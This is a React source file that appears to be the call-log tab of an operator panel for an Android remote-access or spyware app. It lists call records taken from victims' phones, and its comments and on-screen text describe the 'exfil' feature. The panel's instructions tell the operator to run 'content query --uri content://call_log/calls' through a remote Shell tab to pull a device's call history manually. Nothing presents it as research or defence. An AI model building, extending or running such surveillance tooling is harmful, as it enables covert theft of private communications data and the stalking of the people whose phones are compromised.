import { useEffect } from 'react';
import { Card, CmdBtn, Table, Empty, useData, C } from './shared';

// NOTE: The APK source has no GET_CALL_LOG command.
// READ_CALL_LOG permission is requested but the exfil command is not implemented.
// We attempt via shell fallback and display any cached results.
export default function CallLogsTab({ device }) {
  const { data, loading, load } = useData(device.id, 'call_logs');
  useEffect(() => { load(); }, [device.id]);

  const rows = (data || []).flatMap(e => {
    const d = e.data;
    const arr = Array.isArray(d) ? d : (Array.isArray(d?.calls) ? d.calls : []);
    return arr.map(c => ({
      'Type':     c.type === 1 ? '↙ In' : c.type === 2 ? '↗ Out' : '✕ Miss',
      'Number':   c.number || '—',
      'Name':     c.name || '—',
      'Duration': c.duration ? `${c.duration}s` : '—',
      'Date':     c.date ? new Date(Number(c.date) || c.date).toLocaleString() : '—',
    }));
  });

  return (
    <Card title={`Call Logs (${rows.length})`}
      action={
        <div style={{ display: 'flex', gap: 6 }}>
          <button onClick={() => load()} style={{ padding: '5px 10px', background: 'none',
            border: '1px solid #1e1e2a', borderRadius: 5, color: '#555', fontSize: 11, cursor: 'pointer' }}>↻ Refresh</button>
        </div>
      }>
      <div style={{ fontSize: 11, color: '#444', marginBottom: 10, padding: '6px 8px',
        background: '#0d0d12', borderRadius: 4, border: '1px solid #1a1a26' }}>
        Call log exfiltration is not built into the APK command set. Use the Shell tab
        with <code style={{ color: '#00d26a', fontSize: 11 }}>content query --uri content://call_log/calls</code> to retrieve call logs manually.
      </div>
      {loading && <div style={{ color: '#444', fontSize: 12 }}>loading…</div>}
      {!loading && !rows.length && <Empty text="No call log data available" />}
      {rows.length > 0 && <Table headers={['Type', 'Number', 'Name', 'Duration', 'Date']} rows={rows} />}
    </Card>
  );
}
